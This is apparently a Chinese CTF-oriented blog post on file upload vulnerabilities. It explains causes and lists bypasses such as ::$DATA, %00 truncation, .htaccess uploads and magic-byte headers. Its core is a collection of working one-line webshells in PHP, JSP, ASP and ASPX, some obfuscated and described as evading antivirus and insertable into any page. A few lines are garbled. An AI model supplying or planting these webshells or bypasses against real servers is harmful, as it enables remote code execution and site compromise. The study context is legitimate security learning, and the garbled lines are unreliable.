# 文件上传漏洞


# 文件上传漏洞

&gt; [参考博客](https://blog.csdn.net/qq_43390703/article/details/104858705)

## 原因

程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等

## WebShell

以**asp、php、jsp或者cgi**等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。

## 一句话木马大全

&gt; 可速过

### PHP

```
&lt;?php @eval($_POST[&#39;r00ts&#39;]);?&gt; 
&lt;?php phpinfo();?&gt;
&lt;?php @eval($_POST[cmd]);?&gt;
&lt;?php @eval($_REQUEST[cmd]);?&gt;
&lt;?php assert($_REQUEST[cmd]); ?&gt;
&lt;?php //?cmd=phpinfo() @preg_replace(&#34;/abc/e&#34;,$_REQUEST[&#39;cmd&#39;],&#34;abcd&#34;); ?&gt;
&lt;?php 
//?cmd=phpinfo();
$func =create_function(&#39;&#39;,$_REQUEST[&#39;cmd&#39;]);
$func();
?&gt;

&lt;?php
//?func=system&amp;cmd=whoami
$func=$_GET[&#39;func&#39;];
$cmd=$_GET[&#39;cmd&#39;];
$array[0]=$cmd;
$new_array=array_map($func,$array);
//print_r($new_array);
?&gt;

&lt;?php 
//?cmd=phpinfo()
@call_user_func(assert,$_GET[&#39;cmd&#39;]);
?&gt;

&lt;?php 
//?cmd=phpinfo()
$cmd=$_GET[&#39;cmd&#39;];
$array[0]=$cmd;
call_user_func_array(&#34;assert&#34;,$array);
?&gt;

&lt;?php 
//?func=system&amp;cmd=whoami
$cmd=$_GET[&#39;cmd&#39;];
$array1=array($cmd);
$func =$_GET[&#39;func&#39;];
array_filter($array1,$func);
?&gt;

&lt;?php usort($_GET,&#39;asse&#39;.&#39;rt&#39;);?&gt; php环境&gt;=&lt;5.6才能用
&lt;?php usort(...$_GET);?&gt;  php环境&gt;=5.6才能用
&lt;?php eval($_POST1);?&gt; 
&lt;?php if(isset($_POST[&#39;c&#39;])){eval($_POST[&#39;c&#39;]);}?&gt; 
&lt;?php system($_REQUEST1);?&gt; 
&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; 
&lt;?php eval_r($_POST1)?&gt; 
&lt;?php @eval_r($_POST1)?&gt;//容错代码 
&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;]);?&gt; 
&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;],$_POST[&#39;cc&#39;])?&gt; 
&lt;?php @preg_replace(&#34;/[email]/e&#34;,$_POST[&#39;h&#39;],&#34;error&#34;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&#34;配置&#34;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; 
&lt;?php echo `$_GET[&#39;r&#39;]` ?&gt; 

&lt;script language=&#34;php&#34;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话

&lt;?php (])?&gt;   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！

&lt;?if(isset($_POST[&#39;1&#39;])){eval($_POST[&#39;1&#39;]);}?&gt;&lt;?php system ($_REQUEST[1]);?&gt; 
加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！

&lt;%execute request(“class”)%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%execute request (“class”)%&gt;&lt;%execute request(“class”)&#39;&lt;% loop &lt;%:%&gt; 
无防下载表，有防下载表可尝试插入以下语句突破的一句话 

&lt;%eval(request(“1″)):response.end%&gt; 备份专用
```

### JSP

```
&lt;%if(request.getParameter(&#34;f&#34;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&#34;\\&#34;)&#43;request.getParameter(&#34;f&#34;))).write (request.getParameter(&#34;t&#34;).getBytes());%&gt; 
提交客户端 
&lt;form action=&#34;&#34; method=&#34;post&#34;&gt;&lt;textareaname=&#34;t&#34;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&#34;submit&#34;value=&#34;提交&#34;&gt;&lt;/form&gt;
```

### ASP

```
&lt;%eval(Request.Item[&#34;r00ts&#34;],”unsafe”);%&gt;

&lt;%IfRequest(“1″)&lt;&gt;”&#34;ThenExecuteGlobal(Request(“1″))%&gt; 

&lt;%execute(request(“1″))%&gt; 

&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 
```

### ASPX

```
&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; 

&lt;script language=&#34;C#&#34;runat=&#34;server&#34;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&#34;add6bb58e139be10&#34;)&lt;/script&gt; 

&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。
```

## 漏洞产生原因

* 对于上传文件的后缀名（扩展名）没有做较为严格的限制
* 对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查
* 权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）
* 对于web server对于上传文件或者指定目录的行为没有做限制

## 常见安全问题

* 上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代码执行;
* 上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);
* 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:
* 上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈

除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)&#34;执行此脚本;等

## Web做题！！

&gt; 重要部分捏🎄

### 常见文件后缀

| 文件后缀          | Mime类型                                | 说明                           |
| ----------------- | --------------------------------------- | ------------------------------ |
| .flv              | flv/flv-flash                           | 在线播放                       |
| .html或.htm       | text/html                               | 超文本标记语言文本             |
| .rtf              | application/rtf                         | RTF文本                        |
| .gif 或.png       | image/gif (image/png)                   | GIF图形/PNG图片                |
| .jpeg或.jpg       | image/jpeg                              | JPEG图形                       |
| .au               | audio/basic                             | au声音文件                     |
| .mid或.midi       | audio/midi 或 audio/x-midi              | MIDI音乐文件                   |
| .ra或.ram或.rm    | audio/x-pn-realaudio                    | RealAudio音乐文件              |
| .mpg或.mpeg或.mp3 | video/mpeg                              | MPEG文件                       |
| .avi              | video/x-msvideo                         | AVI文件                        |
| .gz               | application/x-gzip                      | GZIP文件                       |
| .tar              | application/x-tar                       | TAR文件                        |
| .exe              | application/octet-stream                | 下载文件类型                   |
| .rmvb             | video/vnd.rn-realvideo                  | 在线播放                       |
| .txt              | text/plain                              | 普通文本                       |
| .mrp              | application/octet-stream                | MRP文件（国内普遍的手机）      |
| .ipa              | application/iphone-package-archive      | IPA文件 (IPHONE)               |
| .deb              | application/x-debian-package-archive    | DEB文件 (IPHONE)               |
| .apk              | application/vnd.android.package-archive | APK文件 (安卓系统)             |
| .cab              | application/vnd.cab-com-archive         | CAB文件 (Windows Mobile)       |
| .xap              | application/x-silverlight-app           | XAP文件 (Windows Phone 7)      |
| .sis              | application/vnd.symbian.install-archive | SIS文件 (symbian平台)          |
| .jar              | application/java-archive                | JAR文件 (JAVA平台手机通用格式) |
| .jad              | text/vnd.sun.j2me.app-descriptor        | JAD文件 (JAVA平台手机通用格式) |
| .sisx             | application/vnd.symbian.epoc/x-sisx-app | SISX文件 (symbian平台)         |

### 客户端检查

* JS检查

  * 通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查

  * 木马修改后缀名后上传，通过改包工具修改上传

  * 如果是JS脚本检测，在本地浏览器客户端禁用JS即可。

    &gt; 可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。

### 服务端 · 检查后缀

#### 黑名单

* 上传特殊后缀

* `.htaccess`上传

* `.user.ini`

* 后缀大小写绕过

* 空格绕过

* 点绕过

* ::$DATA绕过

  * 原理

    当我们对一个在NTFS分区中的ASP文件发出包含DATA请 求 ，IIS会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“ . ”后面的扩展名，因为多了::DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。

  * 绕过方法 · IIS目录访问权限绕过

    在IIS6.0&#43;PHP、IIS7&#43;asp、IIS7.5&#43;php的环境下，如果目录是通过HTTP Basic来认证，假设网站根目录存在index.php文件，可通过构造如下方式来绕过认证直接访问目录下的文件

    ```
    /admin::$INDEX_ALLOCATION/index.php
    /admin:$i30:$INDEX_ALLOCATION/index.asp
    ```

  * 绕过方法 · 上传绕过黑名单

    在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析

    | 上传的文件名                | 服务器表面现象       | 生成的文件内容       |
    | --------------------------- | -------------------- | -------------------- |
    | Test.php:a.jpg              | 生成 Test.php        | 空                   |
    | Test.php::$DATA             | 生成 test.php        | `&lt;?php phpinfo();?&gt;` |
    | Test.php::$INDEX_ALLOCATION | 生成 test.php 文件夹 |                      |
    | Test.php::$DATA\0.jpg       | 生成 0.jpg           | `&lt;?php phpinfo();?&gt;` |
    | Test.php::$DATA\aaa.jpg     | 生成 aaa.jpg         | `&lt;?php phpinfo();?&gt;` |

* 配合解析漏洞

* 双后缀名绕过

#### 白名单

* MIME绕过

* `%00`截断

  * 原理

    在上传的时候，当文件系统读到`0x00`时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生`0x00`、`%00`上传截断漏洞

  * 绕过方法

    通过抓包截断将`evil.php.jpg`后面的一个`.`换成`0x00`。在上传的时候，当文件系统读到`0x00`时，会认为文件已经结束，从而将`evil.php.jpg`的内容写入到`evil.php`中，从而达到攻击的目的。

* `move_uploaded_file()`

  可以通过 `move_uploaded_file` 函数把自己写的`.htaccess` 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限

### 服务端 · 检查内容

#### 检查文件头

* 常见文件头

  | 格式                       | 文件头               |
  | -------------------------- | -------------------- |
  | TIFF (tif)                 | 49492A00             |
  | Windows Bitmap (bmp)       | 424D                 |
  | CAD (dwg)                  | 41433130             |
  | Adobe Photoshop (psd)      | 38425053             |
  | JPEG (jpg)                 | FFD8FF               |
  | PNG (png)                  | 89504E47             |
  | GIF (gif)                  | 47494638             |
  | XML (xml)                  | 3C3F786D6C           |
  | HTML (html)                | 68746D6C3E           |
  | MS Word/Excel (xls.or.doc) | D0CF11E0             |
  | MS Access (mdb)            | 5374616E64617264204A |
  | ZIP Archive (zip)          | 504B0304             |
  | RAR Archive (rar)          | 52617221             |
  | Wave (wav)                 | 57415645             |
  | AVI (avi)                  | 41564920             |
  | Adobe Acrobat (pdf)        | 255044462D312E       |

* 绕过

  给上传**脚本加上相应的幻数头字节就可以**，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行。

  &gt; 一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符

#### getmagesize()

#### exif_imagetype（）

#### 二次渲染

#### 利用标签绕过`&lt;?PHP?&gt;`检测

### 服务端 · 条件竞争



---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/  

